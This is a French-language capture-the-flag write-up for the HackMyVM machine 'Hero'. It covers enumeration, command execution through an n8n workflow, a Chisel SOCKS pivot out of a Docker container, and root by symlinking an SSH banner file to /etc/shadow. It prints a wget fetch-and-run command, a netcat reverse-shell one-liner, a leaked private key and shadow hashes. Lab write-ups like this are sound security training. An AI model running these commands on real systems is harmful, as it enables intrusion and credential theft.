---
title: "Solution du CTF Hero de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

### From

Hero est un CTF créé par un certain "sml" et disponible sur HackMyVm.

Il est annoncé comme étant de difficulté moyenne. Il est à mon avis un peu plus difficile, car il y a du pivoting.

Pour l'occasion, j'ai réussi à réparer mon VirtualBox qui gelait sur la fenêtre de dialogue d'importation des VM. Il s'est avéré que c'était le thème Lxqt qui était en cause :( 

```console
$ sudo nmap -p- -T5 --script vuln -sCV 192.168.56.101
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.101
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       https://www.tenable.com/plugins/nessus/55976
|       https://seclists.org/fulldisclosure/2011/Aug/175
|_      https://www.securityfocus.com/bid/49303
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
5678/tcp open  rrac?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=86400
|     Last-Modified: Sun, 18 May 2025 13:43:54 GMT
|     ETag: W/"7b7-196e3a30961"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 1975
|     Vary: Accept-Encoding
|     Date: Sun, 18 May 2025 13:47:43 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <script type="module" crossorigin src="/assets/polyfills-DfOJfMlf.js"></script>
|     <meta charset="utf-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="viewport" content="width=device-width,initial-scale=1.0" />
|     <link rel="icon" href="/favicon.ico" />
|     <style>@media (prefers-color-scheme: dark) { body { background-color: rgb(45, 46, 46) } }</style>
|     <script type="text/javascript">
|     window.BASE_PATH = '/';
|     window.REST_ENDPOINT = 'rest';
|     </script>
|     <script src="/rest/sentry.js"></script>
|     <script>!function(t,e){var o,n,
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Vary: Accept-Encoding
|     Date: Sun, 18 May 2025 13:47:43 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
MAC Address: 08:00:27:FC:47:2D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.12 seconds
```

Sur le port 80 on est accueilli par une clé privée SSH :

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwgAAAJAczctSHM3L
UgAAAAtzc2gtZWQyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwg
AAAEAnYotUqBFoopjEVz9Sa9viQ8AhNVTx0K19TC7YQyfwAqiYY31x+ZMvvHfmGWC7ZE75
BbdbAKYEtIX75k6CL27CAAAACnNoYXdhQGhlcm8BAgM=
-----END OPENSSH PRIVATE KEY-----
```

Elle servira sans doute plus tard, car il n'y a pas de SSH ouvert à ce stade.

On peut déjà en extraire les métadonnées :

```console
$ ssh-keygen -l -f ctf.key
256 SHA256:4Bu9VvimE5IW8+f93tPh3/jpwc1VHy3wP4lpeV3S3SQ shawa@hero (ED25519)
```

### Zero

Sur le second service HTTP, on trouve une interface de configuration `n8n` (on est redirigé vers `/setup`).

J'ai trouvé cette description du projet :

[Explore n8n Docs: Your Resource for Workflow Automation and Integrations | n8n Docs](https://docs.n8n.io/#about-n8n)

> n8n (pronounced n-eight-n) helps you to connect any app with an API with any other, and manipulate its data with little or no code.
> 
> - Customizable: highly flexible workflows and the option to build custom nodes.
> - Convenient: use the npm or Docker to try out n8n, or the Cloud hosting option if you want us to handle the infrastructure.
> - Privacy-focused: self-host n8n for privacy and security.

J'ai donc créé un compte administrateur sur l'appli. En fouillant un peu, on voit un mécanisme de workflow qui fait penser à ce que j'avais vu sur [Reddish]({% link _posts/2019-01-26-Solution-du-CTF-Reddish-de-HackTheBox.md %}).

![n8n workflow](/assets/img/hackmyvm/hero_n8n_workflow.png)

Une fois qu'on a mis le trigger de début d'action, on peut ajouter d'autres blocs, certains permettant par exemple d'exécuter des commandes sur le système.

J'ai tenté de rapatrier `reverse-ssh` :

```console
cd /tmp;wget http://192.168.56.1:8000/reverse-sshx64;chmod 755 reverse-sshx64;nohup ./reverse-sshx64
```

Mais je n'ai eu aucune connexion sur mon serveur web. Il s'est avéré que ni curl ni wget ne sont présents.

Un regardant l'IP du système avec `ip addr` on découvre qu'on est dans un docker :

```
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Ce container fait tourner Alpine Linux :

```
Linux 83ed090ff160 6.12.11-0-lts #1-Alpine SMP PREEMPT_DYNAMIC 2025-01-24 20:02:52 x86_64 Linux
```

La seule solution est de passer par ssh :

```bash
scp -i key -o StrictHostKeyChecking=no devloop@192.168.56.1:reverse-sshx64 reverse-sshx64
```

Mais une fois lancé, la durée de vie du process `reverse-ssh` était de longue durée.

### To

Je me suis rabattu sur un shell plus classique à base de Netcat :

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.1 80 >/tmp/f &
```

En explorant le système, je n'ai rien trouvé, idem avec LinPEAS.

Je me suis dit que peut être je suivais une mauvaise piste, alors j'ai cherché une vulnérabilité existante dans n8n et j'ai trouvé ce document :

https://www.synacktiv.com/sites/default/files/2023-05/Synacktiv-N8N-Multiple-Vulnerabilities_0.pdf

Toutefois l'endpoint `credential-translation` mentionné dans le document n'existe pas sur la version n8n qui nous intéresse.

On va donc mettre en place un serveur SOCKS sur le container et le forwarder sur notre machine, ce qui nous permettra de scanner d'éventuels autres containers ou la machine hôte.

Pour cela j'ai utilisé [Chisel](https://github.com/jpillora/chisel).

Sur ma machine, j'utilise cette commande qui met Chisel en écoute sur le port 80 :

```console
$ sudo ./chisel server --host 192.168.56.1 -p 80 --reverse
2025/05/18 22:55:40 server: Reverse tunnelling enabled
2025/05/18 22:55:40 server: Fingerprint jDonc30936TnqIxa+SVdpm4yXfTl56t5OKA8bOou8fc=
2025/05/18 22:55:40 server: Listening on http://192.168.56.1:80
```

Et sur la node n8n, j'ai cette commande qui s'y connecte et indique de créer un serveur SOCKS sur notre machine (port 1080). 

```console
/tmp $ ./chisel client 192.168.56.1:80 R:socks
2025/05/18 20:55:31 client: Connecting to ws://192.168.56.1:80
2025/05/18 20:55:57 client: Connected (Latency 1.113854ms)
```

On peut alors scanner les ports avec Nmap en le faisant passer par proxychains :

```console
$ ./proxychains4 -q -f proxychains.conf nmap -v -T5 -n -Pn -p 22 --open 172.17.0.0/24
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org )
Initiating Connect Scan at 23:39
Scanning 256 hosts [1 port/host]
Discovered open port 22/tcp on 172.17.0.1
```

Nmap a une option `--proxy socks4://proxy:port` mais ça n'a rien trouvé sur le scan de ports. Proxychains utilise ici socks5.

L'utilisation de Chisel rend les choses faciles, car avec ssh, on ne peut pas avoir de "reverse socks" directement.

Sur la node n8n, il y a un serveur ssh qui écoute localement. On n'a pas le mot de passe de l'utilisateur courant (`node`), mais on a l'accès shell.

La solution basée sur SSH aurait été la suivante :

1. Ajouter une clé à nous dans le `authorized_keys` de `node`
2. Utiliser SSH pour forwarder le port SSH de la node n8n vers notre machine (genre sur le port 2222)
3. Faire un `ssh -i notre_cle -D 1080 -p 2222 node@127.0.0.1`
4. Configurer proxychains pour utiliser ce port

Dans les deux cas, on aurait trouvé le SSH sur 172.17.0.1. L'interface réseau du container spécifie un /16, mais les IPs importantes sont généralement au début.

### Hero

C'est le moment d'essayer la clé SSH obtenue au tout début :

```console
$ ./proxychains4 -f proxychains.conf ssh -i /tmp/ctf.key shawa@172.17.0.1 
[proxychains] config file found: proxychains.conf
[proxychains] preloading ./libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.15-git-1-g7de7dd0
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.1:22  ...  OK
The authenticity of host '172.17.0.1 (172.17.0.1)' can't be established.
ED25519 key fingerprint is SHA256:EBZrmf2l6+BtffXHAEtSx6Suq5Wf09yzZlVqbQaGOVM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.1' (ED25519) to the list of known hosts.
shawa was here.
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

hero:~$ ls -al
total 16
drwxr-sr-x    3 shawa    shawa         4096 Feb  6 10:11 .
drwxr-xr-x    3 root     root          4096 Feb  6 10:07 ..
lrwxrwxrwx    1 shawa    shawa            9 Feb  6 10:11 .ash_history -> /dev/null
drwx--S---    2 shawa    shawa         4096 Feb  6 11:19 .ssh
-rw-------    1 shawa    shawa           15 Feb  6 10:11 user.txt
hero:~$ cat user.txt
HMVOHIMNOTREAL
```

Remarquez bien la présence du message `shawa was here.` lors de la connexion SSH.

Lorsque je recherche des fichiers de root que je peux modifier, je trouve un fichier `banner.txt` :

```console
hero:~$ find / -type f -user root -perm -o+w 2> /dev/null | grep -v /proc/ | grep -v /sys/
/var/www/localhost/htdocs/index.html
/opt/banner.txt
```

Et ce fichier contient exactement le message qu'on a vu. Le fichier et le dossier `/opt` ont des permissions qui me permettent de supprimer `banner.txt` et de le recréer.

Ma première idée était de mettre un lien symbolique de `banner.txt` vers la clé privée SSH de root mais ça ne donnait rien lors de la connexion SSH.

J'ai donc tenté le fichier `shadow` :

```console
hero:~$ cd /opt/
hero:/opt$ rm banner.txt
hero:/opt$ ln -s /etc/shadow banner.txt
```

Et là ça fonctionnait :

```console
$ ./proxychains4 -f proxychains.conf ssh -i /tmp/ctf.key shawa@172.17.0.1 
[proxychains] config file found: proxychains.conf
[proxychains] preloading ./libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.15-git-1-g7de7dd0
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.1:22  ...  OK
#Imthepassthaty0uwant!
root:$6$WBuW3zyLro0fagui$gq9zWbt3gEpo26gkIjtgjYZqjCJtjJrJO9EHaWkglVZWwWhQiiSNmMGejRn.Q58Z9knsWP59OQqLPgt2NAWd80:20125:0:::::
bin:!::0:::::
daemon:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
games:!::0:::::
ntp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
klogd:!:20125:0:99999:7:::
chrony:!:20125:0:99999:7:::
nginx:!:20125:0:99999:7:::
shawa:$6$24FnSb8jAyKUSa4W$Z7fiPgCy1q8VTg6eF0tVe2cjlHfZEB.fswQyBWoZdY3PwV6VyckxP8OhskWf/Kgx881HhsT2uWvVPTGRpJ43T.:20125:0:99999:7:::
```

On voit que le passe est en clair (`Imthepassthaty0uwant!`)

```console
hero:~$ su
Password: 
/home/shawa # cd
~ # ls
root.txt
~ # cat root.txt 
HMVNOTINPRODLOL
```
